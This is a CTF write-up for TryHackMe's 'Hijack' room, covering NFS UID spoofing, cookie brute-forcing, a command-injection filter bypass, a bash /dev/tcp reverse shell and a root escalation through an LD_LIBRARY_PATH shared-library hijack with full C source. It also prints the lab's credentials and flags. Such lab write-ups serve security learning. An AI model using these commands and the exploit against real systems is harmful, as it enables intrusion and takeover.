## Hijack - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/hijack)

**IP: 10.10.106.87**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Just doing Nmap for this one since Gobuster found nothing...

  ```
  nmap -sC -sV -p- 10.10.106.87

  PORT      STATE SERVICE  VERSION
  21/tcp    open  ftp      vsftpd 3.0.3
  22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
  |   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
  |_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
  80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Home
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  111/tcp   open  rpcbind  2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100003  2,3,4       2049/tcp   nfs
  |   100003  2,3,4       2049/tcp6  nfs
  |   100003  2,3,4       2049/udp   nfs
  |   100003  2,3,4       2049/udp6  nfs
  |   100005  1,2,3      46146/tcp   mountd
  |   100005  1,2,3      52427/udp   mountd
  |   100005  1,2,3      54161/udp6  mountd
  |   100005  1,2,3      55227/tcp6  mountd
  |   100021  1,3,4      34480/tcp   nlockmgr
  |   100021  1,3,4      34525/tcp6  nlockmgr
  |   100021  1,3,4      40113/udp6  nlockmgr
  |   100021  1,3,4      45314/udp   nlockmgr
  |   100227  2,3         2049/tcp   nfs_acl
  |   100227  2,3         2049/tcp6  nfs_acl
  |   100227  2,3         2049/udp   nfs_acl
  |_  100227  2,3         2049/udp6  nfs_acl
  2049/tcp  open  nfs      2-4 (RPC #100003)
  34480/tcp open  nlockmgr 1-4 (RPC #100021)
  35463/tcp open  mountd   1-3 (RPC #100005)
  46146/tcp open  mountd   1-3 (RPC #100005)
  56757/tcp open  mountd   1-3 (RPC #100005)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- We can't do Anonymous access to FTP so let's check NFS shares.

  ```
  showmount -e 10.10.106.87 
  Export list for 10.10.106.87:
  /mnt/share *

  sudo mount -t nfs 10.10.106.87:/mnt/share temp_folder

  cd temp_folder 
  cd: permission denied: temp_folder
  ```
  
- If you mount a folder that contains files and folders only accessible by some user (by UID), you can create a user locally with that UID and then access it.

  ```
  sudo useradd bimbo -u 1003
  sudo passwd bimbo
  
  su bimbo         
  Password: 
  $ id
  uid=1003(bimbo) gid=1003(bimbo) groups=1003(bimbo)
  $ /bin/bash
  $ cd temp_folder/
  $ ls -al
  total 12
  drwx------ 2 bimbo    bimbo    4096 Aug  8  2023 .
  drwxrwxr-x 3 me       me       4096 Jun  7 19:48 ..
  -rwx------ 1 bimbo    bimbo      46 Aug  8  2023 for_employees.txt
  $ cat for_employees.txt 
  ftp creds :
  
  ftpuser:W3stV1rg1n14M0un741nM4m4
  ```

- Now we have FTP credentials, login and download all the files.

  ```
  ftp 10.10.106.87

  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls -al
  229 Entering Extended Passive Mode (|||8165|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
  drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
  -rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
  -rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
  -rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
  -rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
  -rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
  ```

- Let's check them now.

  ```
  cat .from_admin.txt 
  To all employees, this is "admin" speaking,
  i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.
  
  NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
  
  cat .passwords_list.txt 
  Vxb38mSNN8wxqHxv6uMX
  56J4Zw6cvz8qDvhCWCVy
  qLnqTXydnY3ktstntLGu
  N63nPUxDG2ZvrhZgP978
  [SNIP!]
  ```

---

## 🌐 Web Exploitation 

- Here, Hydra wont work for brute forcing, you have to write your own script. I wrote few and you can find them [here](https://github.com/mauzware/Random-Scripts/tree/main/Hijack-THM).

  ```
  python3 hijack.py 
  Enter the admin page URL: http://10.10.106.87/administration.php
  <Response [200]>
  YWRtaW46YmU4MzJjMTAxZmM3NWFmNGFiYWYwOTI1N2FhN2MxNjk=
  YWRtaW46ZmVjNmRmNjBkZmExZmM1NzllZDljOTEwNGY3NTUyZTM=
  YWRtaW46NjA1NmYyN2U3N2M4NDE2MWY5ZDRhNTM2OTZjNDdhOWI=
  YWRtaW46MTRmMTQ4Njk5YzI3YWUwMTM0NzUxNDNmMzBkMmJiMjI=
  YWRtaW46ZGEwYmE2MWIzZmI0NzYzMTllZmE3YmYyZGU0Y2VmOTc=
  YWRtaW46NWMyYzQ2M2VhZmVhYzg3NzAyZDZhNzhiNTY1YzE0Yzg=
  [SNIP!]
  password: uDh3jCQsdcuLhjVkAy5x
  cookie: YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
  ```
  
- This one gave me both password and base64 encoded admin cookie. I already created a new user on the web app before writing a script and now I just swapped cookies and Voila, I'm admin!

  ```
  URL encoded cookie -> YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
  
  Welcome admin
  
  This site is still under development!
  
  Administration Panel
  
  Services Status Checker
  
  Provide the service name : 
  
  Execute
  ```

---

## ⚙️ Shell Access

- Here we have Service Status Checker which we can abuse for command injection. Basic stuff wont work.

  ```ssh ; ls -> Command injection detected, please provide a service.```
  
- We can bypass filtering with `&&` or `||`.

  ```
  ssh && ls 

  * ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2025-06-07 18:16:32 UTC; 1h 18min ago
    Process: 1060 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 1103 (sshd)
      Tasks: 1
     Memory: 1.5M
        CPU: 356ms
     CGroup: /system.slice/ssh.service
             `-1103 /usr/sbin/sshd -D
  administration.php
  config.php
  index.php
  login.php
  logout.php
  navbar.php
  service_status.sh
  signup.php
  style.css
  ```
  
- Now pop a basic bash shell and let's get those flags.

  ```
  ssh && bash -c 'exec bash -i >& /dev/tcp/YOUR-THM-IP/4444 0>&1'

  nc -lvnp 4444                
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.106.87] 53292
  bash: cannot set terminal process group (1331): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@Hijack:/var/www/html$ whoami
  whoami
  www-data
  www-data@Hijack:/var/www/html$ id
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

---

## 🧍 User Privilege Escalation

- Here, we can't do anything with user `www-data` but there's a `config.php` file that we can read.

  ```
  www-data@Hijack:/var/www/html$ ls -al
  total 48
  drwxr-xr-x 2 www-data www-data 4096 Aug  8  2023 .
  drwxr-xr-x 3 root     root     4096 Aug  8  2023 ..
  -rw-rw-r-- 1 www-data www-data 2062 Jul 12  2023 administration.php
  -rw-rw-r-- 1 www-data www-data  307 Jun 23  2023 config.php
  -rw-rw-r-- 1 www-data www-data 1272 Jul 12  2023 index.php
  -rw-rw-r-- 1 www-data www-data 5957 Jul 12  2023 login.php
  -rw-rw-r-- 1 www-data www-data  220 Jun 23  2023 logout.php
  -rw-rw-r-- 1 www-data www-data  440 Jun 23  2023 navbar.php
  -rw-rw-r-- 1 www-data www-data   88 Jun 23  2023 service_status.sh
  -rw-rw-r-- 1 www-data www-data 3066 Jun 23  2023 signup.php
  -rw-rw-r-- 1 www-data www-data 1916 Jun 23  2023 style.css
  www-data@Hijack:/var/www/html$ cat config.php 
  <?php
  $servername = "localhost";
  $username = "rick";
  $password = "N3v3rG0nn4G1v3Y0uUp";
  $dbname = "hijack";
  
  // Create connection
  $mysqli = new mysqli($servername, $username, $password, $dbname);
  
  // Check connection
  if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
  }
  ?>
  ```
  
- NEVER REUSE PASSWORDS!!!!!!!!!

  ```
  www-data@Hijack:/var/www/html$ su rick
  Password: 
  rick@Hijack:/var/www/html$
  
  rick@Hijack:/var/www/html$ cd /home
  rick@Hijack:/home$ ls -al
  total 16
  drwxr-xr-x  4 root    root    4096 Aug  8  2023 .
  drwxr-xr-x 23 root    root    4096 Jun  7 18:16 ..
  drwxr-xr-x  2 ftpuser ftpuser 4096 Aug  8  2023 ftpuser
  drwxr-xr-x  2 rick    rick    4096 Aug  8  2023 rick
  rick@Hijack:/home$ cd rick/
  rick@Hijack:~$ ls -al
  total 12
  drwxr-xr-x 2 rick rick 4096 Aug  8  2023 .
  drwxr-xr-x 4 root root 4096 Aug  8  2023 ..
  lrwxrwxrwx 1 root root    9 Aug  8  2023 .bash_history -> /dev/null
  lrwxrwxrwx 1 root root    9 Aug  8  2023 .mysql_history -> /dev/null
  -rw------- 1 rick rick   38 Aug  8  2023 user.txt
  rick@Hijack:~$ cat user.txt 
  THM{fdc8cd4cff2c19e0d1022e78481ddf36}
  ```
  
- Tutorial ngl.

---

## 👑 Root Privilege Escalation

- Now, let's do the coolest exploitation ever.

  ```
  rick@Hijack:~$ sudo -l
  [sudo] password for rick: 
  Matching Defaults entries for rick on Hijack:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
      env_keep+=LD_LIBRARY_PATH
  
  User rick may run the following commands on Hijack:
      (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
  ```
  
- You can find all the details about exploiting `LD_LIBRARY_PATH` on [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD%20Library#ld_preload---ld_library_path).

- Exploitation is pretty straightforward. We create a new file, paste the C code, compile it and then run the PATH with SUDO command that we can use. Do all of that in `/tmp`.

  ```
  rick@Hijack:/tmp$ nano exploit.c
  rick@Hijack:/tmp$ cat exploit.c 
  #include <stdio.h>
  #include <stdlib.h>
  
  static void hijack() __attribute__((constructor));
  
  void hijack() {
          unsetenv("LD_LIBRARY_PATH");
          setresuid(0,0,0);
          system("/bin/bash -p");
  }
  
  rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/exploit.c
  /tmp/exploit.c: In function ‘hijack’:
  /tmp/exploit.c:8:9: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
           setresuid(0,0,0);
  ```
  
- All steps are done except running the exploit. Do it like a pro now!

  ```
  rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
  /usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
  root@Hijack:/tmp# whoami
  root
  root@Hijack:/tmp# id
  uid=0(root) gid=0(root) groups=0(root)
  
  root@Hijack:/tmp# cat /root/root.txt
  
  ██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
  ██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
  ███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
  ██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
  ██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
  ╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
  
  THM{b91ea3e8285157eaf173d88d0a73ed5a}
  ```

- You can escalate with LD_PRELOAD like this as well, I'll cover that in another room named `Creative` which I did after this one.

---

## 🏁 Flags

- **User Flag**: `THM{fdc8cd4cff2c19e0d1022e78481ddf36}`
- **Root Flag**: `THM{b91ea3e8285157eaf173d88d0a73ed5a}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Writing a script and making C compiling work.`

- What did I learn?
  `New privilege escalation and practiced more scripting.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
